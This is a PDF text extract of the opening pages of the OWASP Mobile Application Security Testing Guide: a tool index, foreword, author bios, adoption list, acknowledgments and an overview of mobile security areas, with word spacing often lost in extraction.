. . . . . . . . . . . . . . . . . . . . . . . . . . . 534 Magisk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 534 FlowDroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 535 jdb . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 535 APKLab . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 535 Busybox . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 535 Proguard . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 536 MobSFforAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 536 BytecodeViewer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 536 radare2forAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 537 AndroidNDK . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 541 jadx . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 542 nm-Android . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 542 Android-SSL-TrustKiller . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 542 House . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 542 AndroidSDK . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 543 simctl . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 544 lldb . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 544 9\nXcodeCommandLineTools . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 544 class-dump-dyld . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 544 FridaforiOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 544 security . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 546 SwiftShield . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 546 MachoOView . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 548 Usbmuxd . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 548 Xcode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 548 Frida-ios-dump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 548 gdb . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 radare2foriOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 Frida-cycript . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 iProxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 nm-iOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 SSLKillSwitch2 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 549 ios-deploy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 550 iOSbackup . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 550 MobSFforiOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 550 class-dump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 551 Sileo . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 551 Cydia . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 552 class-dump-z . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 553 Plutil . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 553 otool . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 553 BinaryCookieReader . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 553 objectionforiOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 553 swift-demangle . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 554 Keychain-Dumper . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 555 Grapefruit . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 555 Cycript . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 555 xcrun . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 558 optool . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 558 dsdump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 558 bettercap . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 559 BurpSuite . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 559 Wireshark . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 OWASPZAP . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 tcpdump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 MITMRelay . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 Androidtcpdump . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 r2frida . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 560 Frida . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 562 FridaCodeShare . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 564 LIEF . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 564 Ghidra . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 565 RMSRuntimeMobileSecurity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 569 iaito . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 569 MobSF . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 570 objection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 570 Referenceapplications 571 OVAA . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 571 InsecureShop . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 571 AndroGoat . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 571 AndroidLicenseValidator . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 571 InsecureBankv2 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 572 DodoVulnerableBank . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 572 AndroidUnCrackableL3 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 572 AndroidUnCrackableL1 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 572 10\nMASTGHackingPlayground(Kotlin) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 572 MASTGHackingPlayground(Java) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 573 Digitalbank . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 573 DIVAAndroid . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 573 DVHMA . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 573 AndroidUnCrackableL4 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 573 AndroidUnCrackableL2 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 574 DVIA . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 574 DVIA-v2 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 574 SuggestedReading 575 MobileAppSecurity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 575 ReverseEngineering . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 575 11\nForeword WelcometotheOWASPMobileApplicationSecurityTestingGuide. Feelfreetoexploretheexistingcontent,butdonote thatit may changeat any time. New APIsand best practicesareintroducediniOS and Androidwithevery major (and minor)releaseandalsovulnerabilitiesarefoundeveryday. Ifyouhavefeedbackorsuggestions,orwanttocontribute,createanissueonGitHuborpingusonSlack. SeetheREADME forinstructions: https://www.github.com/OWASP/owasp-mastg/ squirrel(nounplural): AnyarborealsciurinerodentofthegenusSciurus,suchasS.vulgaris(redsquirrel) orS.carolinensis(greysquirrel),havingabushytailandfeedingonnuts,seeds,etc. On a beautiful summer day, a group of ~7 young men, a woman, and approximately three squirrels met in a Woburn ForestvilladuringtheOWASPSecuritySummit2017. Sofar,nothingunusual. Butlittledidyouknow,withinthenextfive days,theywouldredefinenotonlymobileapplicationsecurity,buttheveryfundamentalsofbookwritingitself(ironically, theeventtookplacenearBletchleyPark,oncetheresidenceandworkplaceofthegreatAlanTuring). Ormaybethat’sgoingtoofar. Butatleast,theyproducedaproof-of-conceptforanunusualsecuritybook. TheMobile ApplicationSecurityTestingGuide(MASTG)isanopen,agile,crowd-sourcedeffort,madeofthecontributionsofdozens ofauthorsandreviewersfromallovertheworld. Becausethisisn’tanormalsecuritybook,theintroductiondoesn’tlistimpressivefactsanddataprovingimportanceof mobile devices in this day and age. It also doesn’t explain how mobile application security is broken, and why a book likethiswassorelyneeded,andtheauthorsdon’tthanktheirbelovedoneswithoutwhomthebookwouldn’thavebeen possible. We do have a message to our readers however! The first rule of the OWASP Mobile Application Security Testing Guide is: Don’tjustfollowtheOWASPMobileApplicationSecurityTestingGuide. Trueexcellenceatmobileapplicationsecurity requiresadeepunderstandingofmobileoperatingsystems,coding,networksecurity,cryptography,andawholelotof otherthings,manyofwhichwecanonlytouchonbrieflyinthisbook. Don’tstopatsecuritytesting. Writeyourownapps, compileyourownkernels,dissectmobilemalware,learnhowthingstick. Andasyoukeeplearningnewthings,consider contributingtotheMASTGyourself! Or,astheysay: “Doapullrequest”. 12\n13\nFrontispiece About the OWASP MASTG TheOWASPMobileApplicationSecurityTestingGuide(MASTG),whichispartoftheOWASPMobileApplicationSecurity (MAS) flagship project, is a comprehensive manual covering the processes, techniques, and tools used during mobile applicationsecurityanalysis,aswellasanexhaustivesetoftestcasesforverifyingtherequirementslistedintheOWASP Mobile Application Security Verification Standard (MASVS), providing a baseline for complete and consistent security tests. The OWASP MASVS and MASTG are trusted by the following platform providers and standardization, governmental and educationalinstitutions. Learnmore. Authors Bernhard Mueller Bernhardisacybersecurityspecialistwithatalentforhackingsystemsofallkinds. Duringmorethanadecadeinthe industry,hehaspublishedmanyzero-dayexploitsforsoftwaresuchasMSSQLServer,AdobeFlashPlayer,IBMDirector, CiscoVOIP,andModSecurity. Ifyoucannameit,hehasprobablybrokenitatleastonce. BlackHatUSAcommendedhis pioneeringworkinmobilesecuritywithaPwnieAwardforBestResearch. Sven Schleier Sven is an experienced web and mobile penetration tester and assessed everything from historic Flash applications to progressive mobile apps. He is also a security engineer that supported many projects end-to-end during the SDLC to “build security in”. He was speaking at local and international meetups and conferences and is conducting hands-on workshopsaboutwebapplicationandmobileappsecurity. 14\nJeroen Willemsen Jeroenisaprincipalsecurityarchitectwithapassionformobilesecurityandriskmanagement. Hehassupportedcompa- niesasasecuritycoach,asecurityengineerandasafull-stackdeveloper,whichmakeshimajackofalltrades. Heloves explainingtechnicalsubjects: fromsecurityissuestoprogrammingchallenges. Carlos Holguera Carlosisamobilesecurityresearchengineerwhohasgainedmanyyearsofhands-onexperienceinthefieldofsecurity testing for mobile apps and embedded systems such as automotive control units and IoT devices. He is passionate about reverse engineering and dynamic instrumentation of mobile apps and is continuously learning and sharing his knowledge. Co-Authors Co-authorshaveconsistentlycontributedqualitycontentandhaveatleast2,000additionsloggedintheGitHubreposi- tory. Romuald Szkudlarek Romualdisapassionatecybersecurity&privacyprofessionalwithover15yearsofexperienceintheweb,mobile,IoT and cloud domains. During his career, he has been dedicating his spare time to a variety of projects with the goal of advancing the sectors of software and security. He is teaching regularly at various institutions. He holds CISSP, CCSP, CSSLP,andCEHcredentials. Jeroen Beckers JeroenisamobilesecurityleadresponsibleforqualityassuranceonmobilesecurityprojectsandforR&Donallthings mobile. Althoughhestartedhiscareerasaprogrammer,hefoundthatitwasmorefuntotakethingsapartthantoput thingstogether,andtheswitchtosecuritywasquicklymade. Eversincehismaster’sthesisonAndroidsecurity,Jeroen has been interested in mobile devices and their (in)security. He loves sharing his knowledge with other people, as is demonstratedbyhismanytalks&trainingsatcolleges,universities,clientsandconferences. Vikas Gupta Vikasisanexperiencedcybersecurityresearcher,withexpertiseinmobilesecurity. Inhiscareerhehasworkedtosecure applicationsforvariousindustriesincludingfintech,banksandgovernments. Heenjoysreverseengineering,especially obfuscatednativecodeandcryptography. Heholdsmastersinsecurityandmobilecomputing,andanOSCPcertification. Heisalwaysopentosharehisknowledgeandexchangeideas. 15\nChangelog AllourChangelogsareavailableonlineattheOWASPMASTGGitHubrepository,seetheReleasespage: https://github.com/OWASP/owasp-mastg/releases Disclaimer PleaseconsultthelawsinyourcountrybeforeexecutinganytestsagainstmobileappsbyutilizingtheMASTGmaterials. RefrainfromviolatingthelawswithanythingdescribedintheMASTG. Our[CodeofConduct]hasfurtherdetails: https://github.com/OWASP/owasp-mastg/blob/master/CODE_OF_CONDUCT. md OWASP thanks the many authors, reviewers, and editors for their hard work in developing this guide. If you have any commentsorsuggestions,pleaseconnectwithus: https://mas.owasp.org/contact IfyoufindanyinconsistenciesortypospleaseopenanissueintheOWASPMASTGGithubRepo: https://github.com/OWA SP/owasp-mastg Copyright and License Copyright©TheOWASPFoundation. ThisworkislicensedunderaCreativeCommonsAttribution-ShareAlike4.0Interna- tionalLicense. Foranyreuseordistribution,youmustmakecleartoothersthelicensetermsofthiswork. 16\nOWASP MASVS and MASTG Adoption The OWASP MASVS and MASTG are trusted by the following platform providers and standardization, governmental and educationalinstitutions. Mobile Platform Providers Google Android Since 2021 Google has shown their support for the OWASP Mobile Security project (MASTG/MASVS) and has started providingcontinuousandhighvaluefeedbacktotheMASVSrefactoringprocessviatheAppDefenseAlliance(ADA)and itsMASA(MobileApplicationSecurityAssessment)program. With MASA, Google has acknowledged the importance of leveraging a globally recognized standard for mobile app se- curityto the mobile appecosystem. Developers canwork directlywith an AuthorizedLab partner to initiate asecurity assessment. Googlewillrecognizedeveloperswhohavehadtheirapplicationsindependentlyvalidatedagainstasetof MASVSLevel1requirementsandwillshowcasethisontheirDatasafetysection. WethankGoogle,theADAandallitsmembersfortheirsupportandfortheirexcellentworkonprotectingthemobileapp ecosystem. Certification Institutions CREST CREST is an international not-for-profit, membership body who quality assures its members and delivers professional certifications to the cyber security industry. CREST works with governments, regulators, academe, training partners, professionalbodiesandotherstakeholdersaroundtheworld. InAugust2022,CRESTlaunchedtheOWASPVerificationStandard(OVS)Programme. CRESTOVSsetsnewstandardsfor applicationsecurity. UnderpinnedbyOWASP’sApplicationSecurityVerificationStandard(ASVS)andMobileApplication Security Verification Standard (MASVS), CREST is leveraging the open-source community to build and maintain global standardstodeliveraglobalwebandmobileapplicationsecurityframework. Thiswillprovideassurancetothebuying communitythatdevelopersusingCRESTOVSaccreditedproviders,alwaysknowthattheyareengagedwithethicaland capableorganisationswithskilledandcompetentsecuritytestersbyleveragingtheOWASPASVSandMASVSstandards. • CRESTOVSProgramme • CRESTOVSAccreditationProcess • CRESTOVSIntroductoryVideo 17\nWe thank CREST for their consulation regarding the OVS programme and its support to the open-source community to buildandmaintainglobalcybersecuritystandards. Standardization Institutions NIST (National Institute of Standards and Technology, United States) TheNationalInstituteofStandardsandTechnology(NIST)wasfoundedin1901andisnowpartoftheU.S.Departmentof Commerce. NISTisoneofthenation’soldestphysicalsciencelaboratories. Congressestablishedtheagencytoremove amajorchallengetoU.S.industrialcompetitivenessatthetime—asecond-ratemeasurementinfrastructurethatlagged behindthecapabilitiesoftheUnitedKingdom,Germanyandothereconomicrivals. • NIST.SP.800-163“VettingtheSecurityofMobileApplications”Revision1,2019 • NIST.SP.800-218“SecureSoftwareDevelopmentFramework(SSDF)v1.1: RecommendationsforMitigatingtheRisk ofSoftwareVulnerabilities”v1.1,2022 BSI (Bundesamt für Sicherheit in der Informationstechnik, Germany) BSIstandsfor“FederalOfficeforInformationSecurity”,ithasthegoaltopromoteITsecurityinGermanyandisthecentral ITsecurityserviceproviderforthefederalgovernment. • TechnicalGuidelineBSITR-03161SecurityrequirementsforeHealthapplicationsv1.0,2020 • PrüfvorschriftfürdenProduktgutachterdes„ePA-FrontenddesVersicherten“unddes„E-Rezept-FrontenddesVer- sichertenv2.0,2021 ioXt 18\nThe mission of the ioXt Alliance is to build confidence in Internet of Things products through multi-stakeholder, inter- national, harmonized, and standardized security and privacy requirements, product compliance programs, and public transparencyofthoserequirementsandprograms. In2021,ioXthasextendeditssecurityprinciplesthroughtheMobileApplicationprofile,sothatappdeveloperscanensure theirproductsarebuiltwith, andmaintain, highcybersecuritystandardssuchastheOWASPMASVSandtheVPNTrust Initiative. TheioXtMobileApplicationprofileisasecuritystandardthatappliestoanycloudconnectedmobileappand providesthemuchneededmarkettransparencyforconsumerandcommercialmobileappsecurity. • ioXtBaseProfilev2.0 Governmental Institutions Name Document Year EuropeanPaymentsCouncil PaymentThreatsandFraudTrendsReport 2021 EuropeanPaymentsCouncil MobileInitiatedSEPACreditTransferInteroperability 2019 ImplementationGuidelines,includingSCTInstant(MSCTIIGs) ENISA(EuropeanUnionAgencyfor GoodPracticesforSecurityofSMARTCARS 2019 Cybersecurity) GovernmentofIndia,MinistryofElectronics AdoptionofMobileAppSecVerificationStandard(MASVS) 2019 &InformationTechnology Version1.0ofOWASP FinishTransportandCommunicationAgency Assessmentguidelineforelectronicidentificationservices 2019 (TRAFICOM) (Draft) GobiernodeEspañaINCIBE CiberseguridadenSmartToys 2019 Educational Institutions Name Document Year LeibnizFachhochschuleHannover,Germany SicherheitsüberprüfungvonmobileniOSAppsnachOWASP 2022 (German) UniversityofFlorida,FloridaInstitutefor “SO{U}RCERER:Developer-DrivenSecurityTestingFramework 2021 CybersecurityResearch,UnitedStates forAndroidApps” UniversityofAdelaide,AustraliaandQueen AnEmpiricalAssessmentofGlobalCOVID-19ContactTracing 2021 MaryUniversityofLondon,UnitedKingdom Applications SchoolofInformationTechnology,Mapúa AVulnerabilityAssessmentontheParentalControlMobile 2021 University,Philippines ApplicationsSecurity: StatusbasedontheOWASPSecurity Requirements Application in Scientific Research • STAMBA:SecurityTestingforAndroidMobileBankingApps Books • Hands-OnSecurityinDevOps 19\nIndustry Case Studies • CaseStudy: NowSecureCommitstoSecurityStandards Wouldyouliketocontributewithyourcasestudy? Connectwithus! 20\nAcknowledgments Contributors AllofourcontributorsarelistedintheContributingsectionoftheOWASPMASwebsite: https://mas.owasp.org/contributing/ (cid:0) MAS Advocates MASAdvocatesareindustryadoptersoftheOWASPMASVSandMASTGwhohaveinvestedasignificantandconsistent amount of resources to push the project forward by providing consistent high-impact contributions and continuously spreadingtheword. (cid:0) Being an “MAS Advocate” is the highest status that companies can achieve in the project acknowledging that they’vegoneaboveandbeyondtosupporttheproject. Wewillvalidatethisstatusaccordingtothesecategories: 1. ShowingAdoption: itshouldbeclearjustfromlookingattheofficialcompanypagethattheyhaveadoptedthe OWASPMASVSandMASTG.Forexample: • Services/Products • Resources(e.g.blogposts,pressreleases,publicpentestreports) • Trainings • etc. 2. Providing consistent high-impact contributions: by continuously supporting with time/dedicated resources withclear/highimpactfortheOWASPMASproject. • ContentPullRequests(e.g.adding/upgradingexistingtests,tooling,maintainingcodesamples,etc.) • TechnicalPRreviews • Improvingautomation(GitHubActions) • Upgrading,extendingorcreatingnewCrackmes • ModeratingGitHubDiscussions • Providinghigh-valuefeedbacktotheprojectandforspecialeventssuchastheMASVS/MASTGrefactoring. • etc. 3. Spreadingthewordandpromotingtheprojectwithmanypresentationseachyear,publictrainings,highsocial mediainvolvement(e.g.liking,re-sharing,doingownpostingspecificallytopromotetheproject). NOTE: You have to satisfy all three categories in order to qualify as an MAS Advocate. However, you do not need to fulfilleachandeverybulletpoint(theyareexamples). Ingeneral,youmustbeabletoclearlyshowthecontinuityofyour contributionsandhighimpactfortheproject. Forexample,tofulfill“2.” youcoulddemonstratethatyou’vebeensending high-impactPullRequestintheinitial6monthsperiodandintendtocontinuetodoso. (cid:0) Benefits • CompanylogodisplayedinourmainREADMEsandmainOWASPprojectsite. • LinkedblogpostsintheMASTGwillincludethecompanyname. • SpecialacknowledgementoneachMASTGreleasecontainingthecontributedPRs. • Re-sharesfromtheOWASPMASaccountsonnewpublications(e.g.retweets). • Initialpublic“ThankYou”andyearlyaftersuccessfulrenewal. 21\n(cid:0) How to Apply Ifyou’dliketoapplypleasecontacttheprojectleadersbysendinganemailtoSvenSchleierandCarlosHolguerawho willvalidateyourapplication. Pleasebesuretoincludesufficientevidence(usuallyintheformofacontributionreport includingURLslinkingtothecorrespondingelements)showingwhatyou’vedoneinthe6monthsperiodthatgoesinline withthethreecategoriesdescribedabove. (cid:0) Important Disclaimers • Ifthe“MASAdvocate”statusisgrantedandyou’dliketomaintainit,theaforementionedcontributionsmustremain consistentaftertheinitialperiodaswell. Youshouldkeepcollectingthisevidenceandsendusacontributionreport yearly. • Financialdonationsarenotpartoftheeligibilitycriteriabutwillbelistedforcompletion. • Re-sharedpublicationsandblogpostslinkedinMASTGtextmustbeeducationalandfocusonmobilesecurityor MASVS/MASTGandnotendorsecompanyproducts/services. • Advocate Companies may use the logo and links to MASVS/MASTG resources as part of their communication but cannotusethemasanendorsementbyOWASPasapreferredproviderofsoftwareandservices. – Exampleofwhat’sok: listMASAdvocatestatusonwebsitehomepage, in“aboutcompany”slidesinsales presentations,onsalescollateral. – Exampleofwhat’snotok: aMASAdvocatecannotclaimtheyareOWASPcertified. • ThequalityoftheapplicationoftheMASVS/MASTGbythesecompanieshasnotbeenvettedbytheMASteam. TheOWASPFoundationisverygratefulforthesupportbytheindividualsandorganizationslisted. Howeverplease note,theOWASPFoundationisstrictlyvendorneutralanddoesnotendorseanyofitssupporters. MASAdvocates donotinfluencethecontentoftheMASVSorMASTGinanyway. Our MAS Advocates NowSecure has provided consistent high-impact contributions to the project and has successfully helped spread the word. We’d like to thank NowSecure for its exemplary contribution which sets a blueprint for other potential contributorswantingtopushtheprojectforward. NowSecure as a MASVS/MASTG Adopter • Services/Products: – NowSecureDebutsNewOWASPMASVSMobilePenTests – NowSecurePlatformforAutomatedMobileSecurityTesting • Resources: – TheEssentialGuidetotheOWASPMobileSecurityProject • Trainings: – StandardsandRiskAssessment – OWASPMASVS&MASTGUpdates – IntrotoMobileAppSecurity 22\nNowSecure’s Contributions to the MAS Project High-impactContributions(time/dedicatedresources): • ContentPRs • TechnicalReviewsforPRs • ParticipationinGitHubDiscussions AspecialmentiongoesforthecontributiontotheMASVSRefactoring: • Significanttimeinvestmenttodrivethediscussionsandcreatetheproposalsalongwiththecommunity • TestabilityAnalysis • Feedbackoneachcategoryproposal • Statisticsfrominternalanalysis Inthepast, NowSecurehasalsocontributedtotheproject, hassponsoreditbecominga“GodModeSponsor”andhas donatedtheUnCrackableAppforAndroidLevel4: Radare2Pay. SpreadingtheWord: • Socialmediainvolvement: continuousTwitterandLinkedInactivity(seeexamples) • CaseStudy: NowSecureCommitstoSecurityStandards • BlogPosts: – Integratesecurityintothemobileappsoftwaredevelopmentlifecycle – OWASPMobileSecurityTestingChecklistAidsCompliance • Presentations: – “MobileWanderlust”! OurjourneytoVersion2.0! (OWASPAppSecEU,Jun102022) – InsidersGuidetoMobileAppSecwithLatestOWASPMASVS(OWASPTorontoChapter,Feb102022) – InsidersGuidetoMobileAppSecwithLatestOWASPMASVS(OWASPVirtualAppSec2021,Nov112021) – InsidersGuidetoMobileAppSecwithOWASPMASVS(OWASPNorthernVirginiaChapter,Oct82021) – andmore Donators WhileboththeMASVSandtheMASTGarecreatedandmaintainedbythecommunityonavoluntarybasis,sometimesa littlebitofoutsidehelpisrequired. Wethereforethankourdonatorsforprovidingthefundstobeabletohiretechnical editors. Note that their donation does not influence the content of the MASVS or MASTG in any way. The Donation PackagesaredescribedonourOWASPProjectpage. 23\n24\nIntroduction to the OWASP Mobile Application Security Project Newtechnologyalwaysintroducesnewsecurityrisks,andmobilecomputingisnoexception. Securityconcernsformobile apps differ from traditional desktop software in some important ways. Modern mobile operating systems are arguably moresecurethantraditionaldesktopoperatingsystems,butproblemscanstillappearwhenwedon’tcarefullyconsider security during mobile app development. Data storage, inter-app communication, proper usage of cryptographic APIs, andsecurenetworkcommunicationareonlysomeoftheseconsiderations. The OWASP Mobile Application Security Verification Standard (MASVS) defines a mobile app security model and lists genericsecurityrequirementsformobileapps. Itcanbeusedbyarchitects,developers,testers,securityprofessionals, andconsumerstodefineandunderstandthequalitiesofasecuremobileapp. TheOWASPMobileApplicationSecurity TestingGuide(MASTG)mapstothesamebasicsetofsecurityrequirementsofferedbytheMASVSanddependingonthe contexttheycanbeusedindividuallyorcombinedtoachievedifferentobjectives. Forexample,theMASVSrequirementscanbeusedinanapp’splanningandarchitecturedesignstageswhilethechecklist andtestingguidemayserveasabaselineformanualsecuritytestingorasatemplateforautomatedsecuritytestsduring orafterdevelopment. Inthe“MobileAppSecurityTesting”chapterwe’lldescribehowyoucanapplythechecklistand MASTGtoamobileapppenetrationtest. Key Areas in Mobile Application Security Many mobile app penetration testers have a background in network and web app penetration testing, a quality that is valuable for mobile app testing. Almost every mobile app talks to a backend service, and those services are prone to the same types of attacks we are familiar with in web apps on desktop machines. Mobile apps differ in that there is a smallerattacksurfaceandthereforemoresecurityagainstinjectionandsimilarattacks. Instead,wemustprioritizedata protectiononthedeviceandthenetworktoincreasemobilesecurity. Let’sdiscussthekeyareasinmobileappsecurity. 25\nData Storage and Privacy (MASVS-STORAGE) Theprotectionofsensitivedata,suchasusercredentialsandprivateinformation,iscrucialtomobilesecurity. Ifanapp usesoperatingsystemAPIssuchaslocalstorageorinter-processcommunication(IPC)improperly,theappmightexpose sensitivedatatootherappsrunningonthesamedevice. Itmayalsounintentionallyleakdatatocloudstorage,backups, orthekeyboardcache. Additionally,mobiledevicescanbelostorstolenmoreeasilycomparedtoothertypesofdevices, soit’smorelikelyanindividualcangainphysicalaccesstothedevice,makingiteasiertoretrievethedata. Whendevelopingmobileapps,wemusttakeextracarewhenstoringuserdata. Forexample,wecanuseappropriatekey storageAPIsandtakeadvantageofhardware-backedsecurityfeatureswhenavailable. FragmentationisaproblemwedealwithespeciallyonAndroiddevices. NoteveryAndroiddeviceoffershardware-backed securestorage, andmanydevicesarerunningoutdatedversionsofAndroid. Foranapptobesupportedontheseout- of-date devices, it would have to be created using an older version of Android’s API which may lack important security features. Formaximumsecurity,thebestchoiceistocreateappswiththecurrentAPIversioneventhoughthatexcludes someusers. Cryptography (MASVS-CRYPTO) Cryptography is an essential ingredient when it comes to protecting data stored on a mobile device. It is also an area wherethingscangohorriblywrong,especiallywhenstandardconventionsarenotfollowed. Itisessentialtoensurethat theapplicationusescryptographyaccordingtoindustrybestpractices,includingtheuseofprovencryptographiclibraries, aproperchoiceandconfigurationofcryptographicprimitivesaswellasasuitablerandomnumbergeneratorwherever randomnessisrequired. Authentication and Authorization (MASVS-AUTH) Inmostcases,sendinguserstologintoaremoteserviceisanintegralpartoftheoverallmobileapparchitecture. Even thoughmostoftheauthenticationandauthorizationlogichappensattheendpoint,therearealsosomeimplementation challengesonthemobileappside. Unlikewebapps,mobileappsoftenstorelong-timesessiontokensthatareunlocked withuser-to-deviceauthenticationfeaturessuchasfingerprintscanning. Whilethisallowsforaquickerloginandbetter userexperience(nobodylikestoentercomplexpasswords),italsointroducesadditionalcomplexityandroomforerror. Mobileapparchitecturesalsoincreasinglyincorporateauthorizationframeworks(suchasOAuth2)thatdelegateauthen- ticationtoaseparateserviceoroutsourcetheauthenticationprocesstoanauthenticationprovider. UsingOAuth2allows theclient-sideauthenticationlogictobeoutsourcedtootherappsonthesamedevice(e.g.thesystembrowser). Security testersmustknowtheadvantagesanddisadvantagesofdifferentpossibleauthorizationframeworksandarchitectures. Network Communication (MASVS-NETWORK) Mobiledevicesregularlyconnecttoavarietyofnetworks,includingpublicWi-Finetworkssharedwithother(potentially malicious) clients. This creates opportunities for a wide variety of network-based attacks ranging from simple to com- plicatedandoldtonew. It’scrucialtomaintaintheconfidentialityandintegrityofinformationexchangedbetweenthe mobileappandremoteserviceendpoints. Asabasicrequirement,mobileappsmustsetupasecure,encryptedchannel fornetworkcommunicationusingtheTLSprotocolwithappropriatesettings. Interaction with the Mobile Platform (MASVS-PLATFORM) Mobile operating system architectures differ from classical desktop architectures in important ways. For example, all mobileoperatingsystemsimplementapppermissionsystemsthatregulateaccesstospecificAPIs. Theyalsooffermore (Android) or less rich (iOS) inter-process communication (IPC) facilities that enable apps to exchange signals and data. 